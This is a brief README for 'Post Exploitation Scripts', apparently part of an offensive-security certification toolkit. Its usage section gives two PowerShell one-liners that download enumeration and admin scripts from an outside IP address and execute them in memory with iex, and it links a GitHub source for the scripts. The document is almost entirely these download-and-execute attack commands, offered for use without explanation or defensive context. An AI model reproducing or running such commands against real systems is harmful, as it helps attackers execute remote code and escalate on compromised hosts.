# Name
Post Exploitation Scripts

## Usage
```
powershell -c "$r = iwr http://192.168.45.203/post_enum.ps1 -UseBasicParsing; $s = (New-Object System.IO.StreamReader($r.RawContentStream)).ReadToEnd(); iex $s"

powershell -c "$r = iwr http://192.168.45.203/post_admin.ps1 -UseBasicParsing; $s = (New-Object System.IO.StreamReader($r.RawContentStream)).ReadToEnd(); iex $s"
```

## Source
https://raw.githubusercontent.com/jayesther/OSEP_OSED_TOOLS/refs/heads/main/OSEP_enum.ps1

